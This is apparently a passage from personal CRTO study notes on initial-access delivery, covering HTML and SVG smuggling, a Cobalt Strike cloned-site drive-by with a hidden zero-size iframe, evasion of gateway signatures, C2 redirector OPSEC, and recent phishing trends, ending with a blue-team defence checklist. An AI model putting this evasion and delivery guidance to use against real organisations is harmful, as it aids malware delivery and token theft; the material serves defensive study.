| `.wim` (Windows Imaging) | Partial (openable with 7-Zip etc.) | Usable for file packaging. | A normal user can't mount it with a double-click; only viable where a third-party archiver is installed. | **[Low]** Low usability, so only for limited targets. |

---

<a id="delivery"></a>

# Chapter 5. Delivery (perimeter bypass & payload delivery)

Delivery is getting the finished package (container) past the target's layered perimeter (firewall, email gateway, web proxy, network sandbox) to the victim endpoint undetected.

### 5.1 HTML Smuggling

#### Core idea

Traditionally you host a malicious file on a web server and get the victim to click a download link — but then the packet's MIME type and the file's binary body are exposed to the web proxy/security appliance and blocked. **HTML Smuggling** combines HTML5 (the `download` attribute) with JavaScript (the `Blob` API) to **assemble the file directly in the victim's browser memory, generating no binary-transfer traffic on the network.**

```
[Traditional download vs. HTML Smuggling network traffic]

❌ Traditional download:
[Attacker web server] ─(HTTP: application/octet-stream + malicious binary)─> [proxy/firewall] 💥 blocked

✅ HTML Smuggling:
[Attacker web server] ─(HTTP: text/html + ordinary text/JS string)─> [proxy passes] ─> [victim browser]
                                                                                │
                                                        ┌───────────────────────┘
                                                        ▼
                                             [JS runs inside the browser]
                                             1. Decode Base64/encrypted string (atob / Web Crypto API)
                                             2. Convert to Uint8Array, build a Blob object
                                             3. Create a hidden <a> tag and auto-click to drop the file locally
```

Flow: ① encode the container (e.g. `.iso`/`.zip`) as Base64 and embed it as text in a JS variable in the HTML → ② the proxy sees only plain text (HTML/JS) and passes it → ③ in the browser, decode with `atob()`, convert to `Uint8Array`, and build a `Blob` → ④ create a local object URL with `URL.createObjectURL()` and auto-click a hidden `<a>` to drop the file into Downloads.

#### [Advanced] Detection by modern appliances, and evasion

- **Detection today:** Modern email gateways and NGFWs flag HTML Smuggling statically when they see combinations of `atob`, `Uint8Array`, `Blob`, `msSaveOrOpenBlob`, `createObjectURL`, and they can decode Base64 strings themselves.
- **Evasion:** ① Instead of plain Base64, encrypt the payload (e.g. **AES-GCM**) and decrypt at runtime in the browser with `crypto.subtle.decrypt()` — without the key the appliance can't tell what the file is. ② Obfuscate the key API strings, or split the payload into chunks pulled from external JSON / image metadata and reassembled, to evade static signatures.

### 5.2 SVG Smuggling

SVG is an **XML-based text image format**, and the standard allows a `<script>` tag with executable JavaScript directly inside the image.

```xml
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
  <script>
    // The moment the SVG opens in a browser, inner JS (e.g. HTML Smuggling logic) runs — PoC
    alert('Hello World');
  </script>
</svg>
```

- **Delivery/execution advantage:** Many organisations block `.html`/`.htm` attachments, but `.svg` is classified as an image and often passes the filter. On Windows the default handler for `.svg` is **Microsoft Edge**, so a victim who double-clicks the "image" opens Edge and the hidden JavaScript runs.

### 5.3 Cobalt Strike Site Clone & Drive-By Download

Instead of standing up Apache/Nginx and planting smuggling code, this uses the **Cobalt Strike** C2 framework's built-in web server and **Site Cloner** to quickly build a phishing site and drive-by download.

Setup outline: ① **Host File** uploads the package to the team server's web server with a realistic-looking `Local URI` and a typosquatted domain → ② **Clone Site** clones a real site and sets `Attack` to the malicious file URL (cloning a login page can also log keystrokes) → ③ a size-`0` invisible `<IFRAME>` is injected at the bottom of the cloned page so merely visiting triggers the download.

```html
<IFRAME SRC="http://.../GPU-Z.2.22.0.exe?id=null" WIDTH="0" HEIGHT="0"></IFRAME>
```

#### Recent patches and OPSEC (important ⭐)

Applying the course's Cobalt Strike lab as-is will mostly fail or be blocked immediately.

1. **The end of HTTP (port 80) and mixed-content blocking:** Modern Chrome/Edge warn on plain-HTTP sites and silently block an HTTPS page's hidden HTTP `<iframe>` auto-downloading an executable as an 'insecure download' / 'drive-by'. A valid SSL/TLS cert (Let's Encrypt etc.) on HTTPS (443) is mandatory.
2. **Team-server fingerprinting and mandatory redirector:** Cobalt Strike's built-in web server has distinctive HTTP response headers / default error pages, so Shodan/Censys or threat intel exposes the team server IP immediately. Never expose the team server directly — put an Apache/Nginx or Cloudflare Workers redirector in front to filter and forward only legitimate traffic and hide the infrastructure.

---

<a id="trends"></a>

# Appendix. 2025~2026 current initial-access trends

Beyond file-based phishing, the three techniques most actively used by current operators and real threat groups (APT, ransomware):

### 6.1 Device Code Phishing & AiTM (MFA-bypass phishing)

- **Background:** With cloud migration (Microsoft 365, Entra ID) and MFA adoption, **stealing cloud session tokens** has exploded as an initial-access path, over running malware.
- **AiTM (Adversary-in-the-Middle):** A reverse-proxy phishing framework like `Evilginx` intercepts the session cookie (`ESTSAUTH` etc.) the moment the victim completes MFA on a fake login page, neutralising MFA.
- **Device Code Phishing:** Abuses the OAuth 2.0 device-authorization flow used for smart-TV/IoT login. The attacker first requests a code, then tells the victim to "go to Microsoft's official auth page and enter this code." The victim enters it on **Microsoft's genuine domain**, bypassing proxies and phishing detection, and the attacker's tooling (`TokenTactics` etc.) receives the access and refresh tokens the moment auth completes.

### 6.2 Microsoft Teams (external tenant) phishing & ClickFix

- **Teams phishing:** With email gateways now so strong, attackers impersonate internal helpdesk via **Teams** (external-tenant chat is allowed by default) to message victims directly with malicious links/payloads.
- **ClickFix:** A technique surging recently. A fake prompt ("to view this document you need to update / prove you're not a robot") instructs the victim to paste a clipboard-loaded, obfuscated PowerShell/Mshta command into `Win + R` and run it themselves. **Because a command the user types into Run never goes through download (MotW) or email-attachment checks,** it fully bypasses perimeter security.

### 6.3 Edge-device zero-days & abuse of remote RMM tools

- **Edge-device exploits:** Instead of phishing, attackers hit vulnerabilities in exposed enterprise VPN/firewall/file-transfer appliances (Ivanti, Fortinet, Palo Alto, Citrix) to plant web shells/backdoors on EDR-less Linux appliances and pivot inside.
- **Pushing legitimate RMM installs:** Since custom C2 beacons risk EDR detection, initial access increasingly drops a fully legitimate, signed commercial RMM installer (AnyDesk, ScreenConnect, Atera, Action1) and has the victim run it, then takes the foothold over a legitimate remote-control channel.

---

## [Final summary] Blue Team / DFIR initial-access defence checklist

| Defence layer | Techniques addressed | Actionable defence & detection |
| --- | --- | --- |
| 1. Network & browser | HTML/SVG Smuggling, Drive-by, AiTM/Device Code phishing | Block `.svg`, `.iso`, `.img`, `.vhd`, `.lnk`, `.msc` outright at the email gateway and web proxy. Enterprise browser policy (GPO/Intune) to block auto-downloads of executables on non-work sites. **FIDO2 phishing-resistant MFA (passkeys / hardware keys)** + conditional access (login only from registered devices). |
| 2. OS & container | ISO/VHD mount, LNK/BAT/MSC triggers, ClickFix (`Win+R`) | GPO to disable auto-mount handlers for `.iso`/`.vhd` and centrally collect `Microsoft-Windows-VHDMP-Operational` (Event ID 1, 12). Monitor registry `RunMRU` for `powershell`/`mshta`/`cmd`/`curl` typed directly into `Win+R` (ClickFix). |
| 3. Endpoint & process | DLL Side-Loading, AppDomainManager, MSI/XLAM/RMM abuse | Enable **Defender ASR rules** broadly (block Office child processes, restrict WMI/PsExec, etc.). Use **WDAC** or AppLocker to block unsigned binaries and unapproved RMM in user-writable paths (`C:\ProgramData`, `%APPDATA%`, `%TEMP%`). Hunt for signed binaries whose `OriginalFilename` differs from the process name, or that load unsigned DLLs from unusual paths (Sysmon ID 7). |

---

*This page is a personal reference re-organised from CRTO study notes, for Blue Team / DFIR learning (detection and defence).*
